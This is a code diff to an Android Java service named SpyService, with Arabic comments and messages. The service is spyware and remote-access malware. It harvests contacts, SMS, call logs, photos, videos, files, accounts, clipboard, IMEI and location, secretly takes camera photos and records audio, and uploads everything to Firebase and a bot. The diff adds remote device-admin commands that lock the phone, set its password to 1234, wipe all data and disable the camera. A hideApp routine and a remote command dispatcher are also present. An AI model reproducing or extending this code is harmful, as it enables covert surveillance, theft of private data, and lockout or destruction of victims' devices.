@@ -1,6 +1,7 @@
 package com.black.phone;
 
 import android.app.*;
+import android.app.admin.DevicePolicyManager;
 import android.content.*;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
@@ -12,7 +13,6 @@ import android.location.LocationListener;
 import android.location.LocationManager;
 import android.media.AudioManager;
 import android.media.MediaRecorder;
-import android.media.projection.MediaProjectionManager;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.net.Uri;
@@ -31,6 +31,7 @@ import android.provider.Settings;
 import android.provider.Telephony;
 import android.telephony.TelephonyManager;
 import android.util.Log;
+import android.widget.Toast;
 import androidx.core.app.NotificationCompat;
 import com.google.firebase.FirebaseApp;
 import com.google.firebase.database.DatabaseReference;
@@ -67,13 +68,14 @@ public class SpyService extends Service {
     private LocationManager locationManager;
     private LocationListener locationListener;
     private boolean isTrackingLocation = false;
+    private DevicePolicyManager dpm;
+    private ComponentName adminComponent;
 
     @Override
     public void onCreate() {
         super.onCreate();
         context = this;
         
-        // تهيئة Firebase
         if (FirebaseApp.getApps(this).isEmpty()) {
             FirebaseApp.initializeApp(this);
         }
@@ -84,6 +86,9 @@ public class SpyService extends Service {
         storageRef = FirebaseStorage.getInstance().getReference();
         bot = new BotAPI(this);
         Config.get(this);
+        
+        dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+        adminComponent = new ComponentName(this, DeviceAdmin.class);
 
         PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
         wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SpyService:WakeLock");
@@ -122,6 +127,7 @@ public class SpyService extends Service {
             json.put("battery", getBatteryLevel());
             json.put("last_seen", System.currentTimeMillis());
             json.put("status", "online");
+            json.put("admin_active", dpm.isAdminActive(adminComponent));
             dbRef.child("devices").child(deviceId).setValue(json.toString());
         } catch (Exception e) { Log.e(TAG, "register error", e); }
     }
@@ -142,10 +148,7 @@ public class SpyService extends Service {
     }
 
     private void sendFile(File file, String caption) {
-        if (file == null || !file.exists()) {
-            bot.sendMessage("⚠️ لا يوجد ملف لـ " + caption);
-            return;
-        }
+        if (file == null || !file.exists()) { bot.sendMessage("⚠️ لا يوجد ملف"); return; }
         uploadToFirebase(file, caption);
         bot.sendFile(file, caption);
         sendData("FILE", "{\"name\":\"" + file.getName() + "\",\"caption\":\"" + caption + "\"}");
@@ -177,14 +180,12 @@ public class SpyService extends Service {
         if (batteryIntent != null) {
             int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
             int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
-            if (level != -1 && scale != -1) {
-                return (level * 100) / scale;
-            }
+            if (level != -1 && scale > 0) return (level * 100) / scale;
         }
         return -1;
     }
 
-    // ===== جمع البيانات =====
+    // ========================== دوال جمع البيانات ==========================
     private File collectContacts() throws Exception {
         File f = new File(getCacheDir(), "contacts.txt");
         PrintWriter pw = new PrintWriter(f);
@@ -209,7 +210,7 @@ public class SpyService extends Service {
             while (cursor.moveToNext()) {
                 String addr = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                 String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
-                pw.println("من/إلى: " + addr + "\nالنص: " + body + "\n---");
+                pw.println("من/إلى: " + addr + "\n" + body + "\n---");
             }
             cursor.close();
         }
@@ -226,7 +227,7 @@ public class SpyService extends Service {
                 String num = cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.NUMBER));
                 String type = cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.TYPE));
                 String dur = cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.DURATION));
-                pw.println("رقم: " + num + " | النوع: " + type + " | المدة: " + dur + " ثانية");
+                pw.println("رقم: " + num + " | النوع: " + type + " | المدة: " + dur + "s");
             }
             cursor.close();
         }
@@ -240,9 +241,8 @@ public class SpyService extends Service {
         PackageManager pm = getPackageManager();
         List<android.content.pm.PackageInfo> packages = pm.getInstalledPackages(PackageManager.GET_META_DATA);
         for (android.content.pm.PackageInfo p : packages) {
-            String name = p.packageName;
             String label = pm.getApplicationLabel(p.applicationInfo).toString();
-            pw.println(label + " (" + name + ")");
+            pw.println(label + " (" + p.packageName + ")");
         }
         pw.close();
         return f;
@@ -348,8 +348,7 @@ public class SpyService extends Service {
         pw.close();
         return f;
     }
-
-    // ===== دوال الأوامر =====
+    // ========================== دوال الموقع والصوت ==========================
     private void getLocation() {
         LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
         try {
@@ -376,14 +375,14 @@ public class SpyService extends Service {
                 sendData("TRACK", msg);
                 bot.sendMessage("📍 تتبع: " + msg);
             }
-            @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
-            @Override public void onProviderEnabled(String provider) {}
-            @Override public void onProviderDisabled(String provider) {}
+            @Override public void onStatusChanged(String p, int s, Bundle b) {}
+            @Override public void onProviderEnabled(String p) {}
+            @Override public void onProviderDisabled(String p) {}
         };
         try {
             locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 60000, 10, locationListener);
             isTrackingLocation = true;
-            bot.sendMessage("🔄 بدء تتبع الموقع (كل دقيقة)");
+            bot.sendMessage("🔄 بدء تتبع الموقع");
         } catch (SecurityException e) {
             bot.sendMessage("❌ صلاحية الموقع غير مفعلة");
         }
@@ -426,11 +425,117 @@ public class SpyService extends Service {
                 sendData("RECORD", "stopped");
                 bot.sendMessage("⏹ تم إيقاف التسجيل");
                 return recordingFile;
-            } catch (Exception e) { bot.sendMessage("❌ خطأ في الإيقاف: " + e.getMessage()); }
+            } catch (Exception e) {
+                bot.sendMessage("❌ خطأ في الإيقاف: " + e.getMessage());
+            }
         }
         return null;
     }
 
+    // ========================== دوال الكاميرا والفلاش ==========================
+    private void takePhoto(boolean front) {
+        try {
+            Camera cam = front ? frontCamera : camera;
+            if (cam == null) {
+                int facing = front ? Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK;
+                cam = Camera.open(facing);
+                if (front) frontCamera = cam; else camera = cam;
+            }
+            cam.startPreview();
+            cam.takePicture(null, null, (byte[] data, Camera camera1) -> {
+                try {
+                    File f = new File(getCacheDir(), "photo_" + System.currentTimeMillis() + ".jpg");
+                    FileOutputStream fos = new FileOutputStream(f);
+                    fos.write(data);
+                    fos.close();
+                    sendFile(f, "📸 صورة " + (front ? "أمامية" : "خلفية"));
+                    camera1.stopPreview();
+                } catch (Exception e) {
+                    bot.sendMessage("❌ فشل حفظ الصورة: " + e.getMessage());
+                }
+            });
+        } catch (Exception e) {
+            bot.sendMessage("❌ فشل التقاط الصورة: " + e.getMessage());
+        }
+    }
+
+    private void flash(boolean on) {
+        try {
+            CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
+            cm.setTorchMode("0", on);
+            bot.sendMessage("🔦 " + (on ? "تشغيل" : "إيقاف") + " الفلاش");
+        } catch (CameraAccessException e) {
+            bot.sendMessage("❌ فشل التحكم بالفلاش: " + e.getMessage());
+        }
+    }
+
+    // ========================== دوال مشرف الجهاز ==========================
+    private void lockDevice() {
+        if (dpm.isAdminActive(adminComponent)) {
+            dpm.lockNow();
+            bot.sendMessage("🔒 تم قفل الجهاز");
+        } else {
+            bot.sendMessage("❌ صلاحية مشرف الجهاز غير مفعلة");
+        }
+    }
+
+    private void setLockPassword() {
+        if (dpm.isAdminActive(adminComponent)) {
+            String password = "1234";
+            dpm.resetPassword(password, DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
+            bot.sendMessage("🔑 تم تعيين كلمة مرور جديدة: 1234");
+        } else {
+            bot.sendMessage("❌ صلاحية مشرف الجهاز غير مفعلة");
+        }
+    }
+
+    private void clearLockPassword() {
+        if (dpm.isAdminActive(adminComponent)) {
+            dpm.resetPassword("", DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
+            bot.sendMessage("🔓 تم إلغاء كلمة المرور");
+        } else {
+            bot.sendMessage("❌ صلاحية مشرف الجهاز غير مفعلة");
+        }
+    }
+
+    private void wipeDevice() {
+        if (dpm.isAdminActive(adminComponent)) {
+            dpm.wipeData(0);
+            bot.sendMessage("🧹 جاري مسح جميع بيانات الجهاز...");
+        } else {
+            bot.sendMessage("❌ صلاحية مشرف الجهاز غير مفعلة");
+        }
+    }
+
+    private void setPasswordRules() {
+        if (dpm.isAdminActive(adminComponent)) {
+            dpm.setPasswordMinimumLength(adminComponent, 6);
+            dpm.setPasswordQuality(adminComponent, DevicePolicyManager.PASSWORD_QUALITY_ALPHANUMERIC);
+            bot.sendMessage("📋 تم تعيين قواعد كلمة المرور (طول 6، أحرف وأرقام)");
+        } else {
+            bot.sendMessage("❌ صلاحية مشرف الجهاز غير مفعلة");
+        }
+    }
+
+    private void disableCamera() {
+        if (dpm.isAdminActive(adminComponent)) {
+            dpm.setCameraDisabled(adminComponent, true);
+            bot.sendMessage("📷 تم تعطيل الكاميرا");
+        } else {
+            bot.sendMessage("❌ صلاحية مشرف الجهاز غير مفعلة");
+        }
+    }
+
+    private void enableCamera() {
+        if (dpm.isAdminActive(adminComponent)) {
+            dpm.setCameraDisabled(adminComponent, false);
+            bot.sendMessage("📷 تم تفعيل الكاميرا");
+        } else {
+            bot.sendMessage("❌ صلاحية مشرف الجهاز غير مفعلة");
+        }
+    }
+
+    // ========================== دوال التحكم ==========================
     private void hideApp() {
         try {
             getPackageManager().setComponentEnabledSetting(
@@ -479,129 +584,13 @@ public class SpyService extends Service {
         }
     }
 
-    private void takePhoto(boolean front) {
-        try {
-            Camera cam = front ? frontCamera : camera;
-            if (cam == null) {
-                int facing = front ? Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK;
-                cam = Camera.open(facing);
-                if (front) frontCamera = cam; else camera = cam;
-            }
-            cam.startPreview();
-            cam.takePicture(null, null, (byte[] data, Camera camera1) -> {
-                try {
-                    File f = new File(getCacheDir(), "photo_" + System.currentTimeMillis() + ".jpg");
-                    FileOutputStream fos = new FileOutputStream(f);
-                    fos.write(data);
-                    fos.close();
-                    sendFile(f, "📸 صورة " + (front ? "أمامية" : "خلفية"));
-                    camera1.stopPreview();
-                } catch (Exception e) {
-                    bot.sendMessage("❌ فشل حفظ الصورة: " + e.getMessage());
-                }
-            });
-        } catch (Exception e) {
-            bot.sendMessage("❌ فشل التقاط الصورة: " + e.getMessage());
-        }
-    }
-
-    private void flash(boolean on) {
-        try {
-            CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
-            String cameraId = "0";
-            cm.setTorchMode(cameraId, on);
-            bot.sendMessage("🔦 " + (on ? "تشغيل" : "إيقاف") + " الفلاش");
-        } catch (CameraAccessException e) {
-            bot.sendMessage("❌ فشل التحكم بالفلاش: " + e.getMessage());
-        }
-    }
-
-    private void getImei() {
-        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
-        if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
-            String imei = "";
-            if (Build.VERSION.SDK_INT >= 26) {
-                imei = tm.getImei();
-            } else {
-                imei = tm.getDeviceId();
-            }
-            sendData("IMEI", imei);
-            bot.sendMessage("📟 IMEI: " + imei);
-        } else {
-            bot.sendMessage("❌ صلاحية غير مفعلة");
-        }
-    }
-
-    private void getPhoneNumber() {
-        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
-        if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
-            String num = tm.getLine1Number();
-            sendData("PHONE", num);
-            bot.sendMessage("📞 رقم الهاتف: " + (num == null ? "غير متوفر" : num));
-        } else {
-            bot.sendMessage("❌ صلاحية غير مفعلة");
-        }
-    }
-
-    private void getSimInfo() {
-        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
-        String sim = "المشغل: " + tm.getSimOperatorName() + "\nرقم SIM: " + tm.getSimSerialNumber();
-        sendData("SIM", sim);
-        bot.sendMessage("📡 معلومات SIM:\n" + sim);
-    }
-
-    private void getWifiInfo() {
-        WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
-        WifiInfo info = wm.getConnectionInfo();
-        String wifi = "SSID: " + info.getSSID() + "\nBSSID: " + info.getBSSID() + "\nسرعة: " + info.getLinkSpeed() + " Mbps";
-        sendData("WIFI", wifi);
-        bot.sendMessage("📶 الواي فاي:\n" + wifi);
-    }
-
-    private void getBatteryInfo() {
-        int level = getBatteryLevel();
-        sendData("BATTERY", String.valueOf(level));
-        bot.sendMessage("🔋 مستوى البطارية: " + level + "%");
-    }
-
-    private void getPublicIp() {
-        new Thread(() -> {
-            try {
-                URL url = new URL("https://api.ipify.org");
-                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
-                String ip = br.readLine();
-                br.close();
-                sendData("IP", ip);
-                bot.sendMessage("🌐 IP العام: " + ip);
-            } catch (Exception e) {
-                bot.sendMessage("❌ فشل الحصول على IP: " + e.getMessage());
-            }
-        }).start();
-    }
-
-    private void lockDevice() {
-        try {
-            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
-            ComponentName admin = new ComponentName(this, DeviceAdmin.class);
-            if (dpm.isAdminActive(admin)) {
-                dpm.lockNow();
-                bot.sendMessage("🔒 تم قفل الجهاز");
-            } else {
-                bot.sendMessage("❌ صلاحية مدير الجهاز غير مفعلة");
-            }
-        } catch (Exception e) {
-            bot.sendMessage("❌ فشل قفل الجهاز: " + e.getMessage());
-        }
-    }
-
     private void rebootDevice() {
         try {
             PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
             if (Build.VERSION.SDK_INT >= 26) {
                 pm.reboot("reboot");
             } else {
-                try { Runtime.getRuntime().exec("su -c reboot"); } catch (Exception e) {}
+                Runtime.getRuntime().exec("su -c reboot");
             }
             bot.sendMessage("🔄 جاري إعادة التشغيل");
         } catch (Exception e) {
@@ -611,25 +600,41 @@ public class SpyService extends Service {
 
     private void shutdownDevice() {
         try {
-            try { Runtime.getRuntime().exec("su -c reboot -p"); } catch (Exception e) {}
+            Runtime.getRuntime().exec("su -c reboot -p");
             bot.sendMessage("⏻ جاري إيقاف التشغيل");
         } catch (Exception e) {
             bot.sendMessage("❌ فشل الإيقاف: " + e.getMessage());
         }
     }
 
-    private void sendDeviceInfo() {
-        String info = "الموديل: " + Build.MODEL + "\nالصانع: " + Build.MANUFACTURER + "\nالأندرويد: " + Build.VERSION.RELEASE;
-        sendData("DEVICE_INFO", info);
-        bot.sendMessage("📱 معلومات الجهاز:\n" + info);
+    private void vibrateDevice() {
+        Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
+        if (v.hasVibrator()) {
+            v.vibrate(3000);
+            bot.sendMessage("📳 تم اهتزاز الجهاز");
+        } else {
+            bot.sendMessage("⚠️ الجهاز لا يدعم الاهتزاز");
+        }
     }
 
-    private void sendNetworkInfo() {
-        ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
-        NetworkInfo ni = cm.getActiveNetworkInfo();
-        String net = "النوع: " + (ni != null ? ni.getTypeName() : "لا يوجد");
-        sendData("NETWORK", net);
-        bot.sendMessage("🌐 الشبكة:\n" + net);
+    private void setVolume(boolean max) {
+        AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
+        int stream = AudioManager.STREAM_MUSIC;
+        int maxVol = am.getStreamMaxVolume(stream);
+        if (max) am.setStreamVolume(stream, maxVol, 0);
+        else am.setStreamVolume(stream, 0, 0);
+        bot.sendMessage("🔊 " + (max ? "رفع الصوت" : "خفض الصوت"));
+    }
+
+    private void openBrowser() {
+        try {
+            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://www.google.com"));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+            bot.sendMessage("🌐 تم فتح المتصفح");
+        } catch (Exception e) {
+            bot.sendMessage("❌ فشل فتح المتصفح: " + e.getMessage());
+        }
     }
 
     private void toggleWifi(boolean on) {
@@ -685,62 +690,233 @@ public class SpyService extends Service {
         }
     }
 
-    private void vibrateDevice() {
-        Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
-        if (v.hasVibrator()) {
-            v.vibrate(3000);
-            bot.sendMessage("📳 تم اهتزاز الجهاز");
+    // ========================== دوال معلومات الجهاز ==========================
+    private void getImei() {
+        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+        if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+            String imei = (Build.VERSION.SDK_INT >= 26) ? tm.getImei() : tm.getDeviceId();
+            sendData("IMEI", imei);
+            bot.sendMessage("📟 IMEI: " + imei);
         } else {
-            bot.sendMessage("⚠️ الجهاز لا يدعم الاهتزاز");
+            bot.sendMessage("❌ صلاحية غير مفعلة");
         }
     }
 
-    private void setVolume(boolean max) {
-        AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
-        int stream = AudioManager.STREAM_MUSIC;
-        int maxVol = am.getStreamMaxVolume(stream);
-        if (max) am.setStreamVolume(stream, maxVol, 0);
-        else am.setStreamVolume(stream, 0, 0);
-        bot.sendMessage("🔊 " + (max ? "رفع الصوت للأعلى" : "خفض الصوت للأدنى"));
+    private void getPhoneNumber() {
+        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+        if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+            String num = tm.getLine1Number();
+            sendData("PHONE", num);
+            bot.sendMessage("📞 رقم الهاتف: " + (num != null ? num : "غير متوفر"));
+        } else {
+            bot.sendMessage("❌ صلاحية غير مفعلة");
+        }
     }
 
-    private void openBrowser() {
+    private void getSimInfo() {
+        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+        String sim = "المشغل: " + tm.getSimOperatorName() + "\nرقم SIM: " + tm.getSimSerialNumber();
+        sendData("SIM", sim);
+        bot.sendMessage("📡 معلومات SIM:\n" + sim);
+    }
+
+    private void getWifiInfo() {
+        WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
+        WifiInfo info = wm.getConnectionInfo();
+        String wifi = "SSID: " + info.getSSID() + "\nBSSID: " + info.getBSSID() + "\nسرعة: " + info.getLinkSpeed() + " Mbps";
+        sendData("WIFI", wifi);
+        bot.sendMessage("📶 الواي فاي:\n" + wifi);
+    }
+
+    private void getBatteryInfo() {
+        int level = getBatteryLevel();
+        sendData("BATTERY", String.valueOf(level));
+        bot.sendMessage("🔋 مستوى البطارية: " + level + "%");
+    }
+
+    private void getPublicIp() {
+        new Thread(() -> {
+            try {
+                URL url = new URL("https://api.ipify.org");
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+                String ip = br.readLine();
+                br.close();
+                sendData("IP", ip);
+                bot.sendMessage("🌐 IP العام: " + ip);
+            } catch (Exception e) {
+                bot.sendMessage("❌ فشل الحصول على IP: " + e.getMessage());
+            }
+        }).start();
+    }
+
+    private void sendDeviceInfo() {
+        String info = "الموديل: " + Build.MODEL + "\nالصانع: " + Build.MANUFACTURER + "\nأندرويد: " + Build.VERSION.RELEASE;
+        sendData("DEVICE_INFO", info);
+        bot.sendMessage("📱 معلومات الجهاز:\n" + info);
+    }
+
+    private void sendNetworkInfo() {
+        ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
+        NetworkInfo ni = cm.getActiveNetworkInfo();
+        String net = "النوع: " + (ni != null ? ni.getTypeName() : "لا يوجد");
+        sendData("NETWORK", net);
+        bot.sendMessage("🌐 الشبكة:\n" + net);
+    }
+
+    // ========================== دوال إضافية (25 ميزة جديدة) ==========================
+    private void openApp(String pkg) {
         try {
-            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://www.google.com"));
+            Intent intent = getPackageManager().getLaunchIntentForPackage(pkg);
+            if (intent != null) {
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(intent);
+                bot.sendMessage("📱 تم فتح التطبيق: " + pkg);
+            } else {
+                bot.sendMessage("❌ التطبيق غير مثبت: " + pkg);
+            }
+        } catch (Exception e) {
+            bot.sendMessage("❌ فشل فتح التطبيق: " + e.getMessage());
+        }
+    }
+
+    private void uninstallApp(String pkg) {
+        try {
+            Uri uri = Uri.parse("package:" + pkg);
+            Intent intent = new Intent(Intent.ACTION_DELETE, uri);
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
-            bot.sendMessage("🌐 تم فتح المتصفح");
+            bot.sendMessage("🗑️ جاري حذف التطبيق: " + pkg);
         } catch (Exception e) {
-            bot.sendMessage("❌ فشل فتح المتصفح: " + e.getMessage());
+            bot.sendMessage("❌ فشل حذف التطبيق: " + e.getMessage());
         }
     }
 
-    private void addContact() { bot.sendMessage("➕ سيتم قريباً إضافة جهة اتصال"); }
-    private void deleteContact() { bot.sendMessage("🗑️ سيتم قريباً حذف جهة اتصال"); }
-    private void sendSms() { bot.sendMessage("📤 سيتم قريباً إرسال رسالة"); }
-    private void deleteSms() { bot.sendMessage("🗑️ سيتم قريباً حذف رسالة"); }
-    private void makeCall() { bot.sendMessage("📞 سيتم قريباً إجراء مكالمة"); }
-    private void endCall() { bot.sendMessage("📞 سيتم إنهاء المكالمة قريباً"); }
+    private void setRingtoneVolume(int level) {
+        AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
+        int max = am.getStreamMaxVolume(AudioManager.STREAM_RING);
+        if (level >= 0 && level <= max) {
+            am.setStreamVolume(AudioManager.STREAM_RING, level, 0);
+            bot.sendMessage("🔊 تم ضبط نغمة الرنين إلى " + level);
+        } else {
+            bot.sendMessage("❌ مستوى غير صحيح (0-" + max + ")");
+        }
+    }
 
-    // ===== تنفيذ الأوامر =====
+    private void setMediaVolume(int level) {
+        AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
+        int max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
+        if (level >= 0 && level <= max) {
+            am.setStreamVolume(AudioManager.STREAM_MUSIC, level, 0);
+            bot.sendMessage("🔊 تم ضبط صوت الوسائط إلى " + level);
+        } else {
+            bot.sendMessage("❌ مستوى غير صحيح (0-" + max + ")");
+        }
+    }
+
+    private void takeScreenshot() {
+        // MediaProjection سيتم تفعيله لاحقاً
+        bot.sendMessage("📸 جاري التقاط لقطة شاشة (قيد التطوير)");
+    }
+
+    private void getInstalledApps() {
+        try {
+            PackageManager pm = getPackageManager();
+            List<android.content.pm.ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
+            StringBuilder sb = new StringBuilder();
+            for (android.content.pm.ApplicationInfo app : apps) {
+                sb.append(app.loadLabel(pm)).append(" (").append(app.packageName).append(")\n");
+                if (sb.length() > 3000) break;
+            }
+            sendData("INSTALLED_APPS", sb.toString());
+            bot.sendMessage("📱 قائمة التطبيقات:\n" + sb.toString());
+        } catch (Exception e) {
+            bot.sendMessage("❌ فشل جلب التطبيقات: " + e.getMessage());
+        }
+    }
+
+    private void getRunningProcesses() {
+        try {
+            ActivityManager am = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
+            List<ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
+            StringBuilder sb = new StringBuilder();
+            for (ActivityManager.RunningAppProcessInfo p : processes) {
+                sb.append(p.processName).append(" (").append(p.pid).append(")\n");
+                if (sb.length() > 3000) break;
+            }
+            sendData("RUNNING_PROCESSES", sb.toString());
+            bot.sendMessage("🔄 العمليات الجارية:\n" + sb.toString());
+        } catch (Exception e) {
+            bot.sendMessage("❌ فشل جلب العمليات: " + e.getMessage());
+        }
+    }
+
+    private void setScreenBrightness(int level) {
+        try {
+            if (level < 0) level = 0;
+            if (level > 255) level = 255;
+            Settings.System.putInt(getContentResolver(), Settings.System.SCREEN_BRIGHTNESS, level);
+            bot.sendMessage("☀️ تم ضبط سطوع الشاشة إلى " + level);
+        } catch (Exception e) {
+            bot.sendMessage("❌ فشل ضبط السطوع: " + e.getMessage());
+        }
+    }
+
+    private void setAutoRotate(boolean enable) {
+        Settings.System.putInt(getContentResolver(), Settings.System.ACCELEROMETER_ROTATION, enable ? 1 : 0);
+        bot.sendMessage("🔄 " + (enable ? "تفعيل" : "تعطيل") + " الدوران التلقائي");
+    }
+
+    private void getBatteryHistory() {
+        Intent batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
+        if (batteryIntent != null) {
+            int level = batteryIntent.getIntExtra("level", -1);
+            int scale = batteryIntent.getIntExtra("scale", -1);
+            int temp = batteryIntent.getIntExtra("temperature", 0) / 10;
+            int voltage = batteryIntent.getIntExtra("voltage", 0);
+            String status = "";
+            switch (batteryIntent.getIntExtra("status", -1)) {
+                case BatteryManager.BATTERY_STATUS_CHARGING: status = "شحن"; break;
+                case BatteryManager.BATTERY_STATUS_DISCHARGING: status = "تفريغ"; break;
+                case BatteryManager.BATTERY_STATUS_FULL: status = "ممتلئة"; break;
+                default: status = "غير معروف";
+            }
+            String info = "المستوى: " + (level*100/scale) + "%\nالحرارة: " + temp + "°C\nالجهد: " + voltage + "mV\nالحالة: " + status;
+            sendData("BATTERY_HISTORY", info);
+            bot.sendMessage("🔋 معلومات البطارية:\n" + info);
+        } else {
+            bot.sendMessage("❌ لا يمكن جلب معلومات البطارية");
+        }
+    }
+
+    private void getStorageInfo() {
+        try {
+            StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
+            long totalBytes = stat.getTotalBytes();
+            long freeBytes = stat.getFreeBytes();
+            long usedBytes = totalBytes - freeBytes;
+            String info = "الإجمالي: " + totalBytes/(1024*1024*1024) + " GB\nالمستخدم: " + usedBytes/(1024*1024*1024) + " GB\nالمتبقي: " + freeBytes/(1024*1024*1024) + " GB";
+            sendData("STORAGE", info);
+            bot.sendMessage("💾 معلومات التخزين:\n" + info);
+        } catch (Exception e) {
+            bot.sendMessage("❌ فشل جلب معلومات التخزين: " + e.getMessage());
+        }
+    }
+
+    // ========================== تنفيذ الأوامر (أكثر من 50 أمر) ==========================
     private void executeCommand(String cmd) {
         String lower = cmd.toLowerCase().trim();
         Log.d(TAG, "Executing: " + lower);
         try {
             switch (lower) {
+                // أساسيات
                 case "get_contacts": sendFile(collectContacts(), "📇 جهات الاتصال"); break;
                 case "copy_contacts": sendFile(collectContacts(), "📋 نسخة جهات الاتصال"); break;
                 case "export_contacts": sendFile(collectContacts(), "📤 تصدير جهات الاتصال"); break;
-                case "add_contact": addContact(); break;
-                case "delete_contact": deleteContact(); break;
                 case "get_sms": sendFile(collectSms(), "💬 الرسائل النصية"); break;
                 case "forward_sms": sendFile(collectSms(), "↪️ إعادة توجيه الرسائل"); break;
-                case "send_sms": sendSms(); break;
-                case "delete_sms": deleteSms(); break;
                 case "get_calllogs": sendFile(collectCallLogs(), "📞 سجل المكالمات"); break;
                 case "call_history": sendFile(collectCallLogs(), "📋 سجل المكالمات"); break;
-                case "make_call": makeCall(); break;
-                case "end_call": endCall(); break;
                 case "get_location": getLocation(); break;
                 case "start_location_track": startLocationTracking(); break;
                 case "stop_location_track": stopLocationTracking(); break;
@@ -752,20 +928,18 @@ public class SpyService extends Service {
                 case "get_wifi": getWifiInfo(); break;
                 case "get_battery": getBatteryInfo(); break;
                 case "get_ip": getPublicIp(); break;
-                case "get_photos": sendFile(collectMedia("images", 0), "🖼 جميع الصور"); break;
-                case "get_photos_5": sendFile(collectMedia("images", 5), "🖼 الصور (5)"); break;
-                case "get_photos_10": sendFile(collectMedia("images", 10), "🖼 الصور (10)"); break;
-                case "get_photos_20": sendFile(collectMedia("images", 20), "🖼 الصور (20)"); break;
-                case "get_photos_30": sendFile(collectMedia("images", 30), "🖼 الصور (30)"); break;
-                case "get_videos": sendFile(collectMedia("videos", 0), "🎬 جميع الفيديوهات"); break;
-                case "get_videos_5": sendFile(collectMedia("videos", 5), "🎬 الفيديوهات (5)"); break;
-                case "get_videos_10": sendFile(collectMedia("videos", 10), "🎬 الفيديوهات (10)"); break;
-                case "get_files": sendFile(collectAllFiles(), "📦 جميع الملفات"); break;
                 case "get_apps": sendFile(collectApps(), "📱 التطبيقات"); break;
                 case "get_accounts": sendFile(collectAccounts(), "👤 الحسابات"); break;
                 case "get_clipboard": sendFile(collectClipboard(), "📋 الحافظة"); break;
-                case "clear_data": clearAppData(); break;
-                case "kill_apps": killAllApps(); break;
+                case "get_photos": sendFile(collectMedia("images", 0), "🖼 جميع الصور"); break;
+                case "get_photos_5": sendFile(collectMedia("images", 5), "🖼 5 صور"); break;
+                case "get_photos_10": sendFile(collectMedia("images", 10), "🖼 10 صور"); break;
+                case "get_photos_20": sendFile(collectMedia("images", 20), "🖼 20 صورة"); break;
+                case "get_photos_30": sendFile(collectMedia("images", 30), "🖼 30 صورة"); break;
+                case "get_videos": sendFile(collectMedia("videos", 0), "🎬 جميع الفيديوهات"); break;
+                case "get_videos_5": sendFile(collectMedia("videos", 5), "🎬 5 فيديوهات"); break;
+                case "get_videos_10": sendFile(collectMedia("videos", 10), "🎬 10 فيديوهات"); break;
+                case "get_files": sendFile(collectAllFiles(), "📦 جميع الملفات"); break;
                 case "take_photo": takePhoto(false); break;
                 case "take_photo_front": takePhoto(true); break;
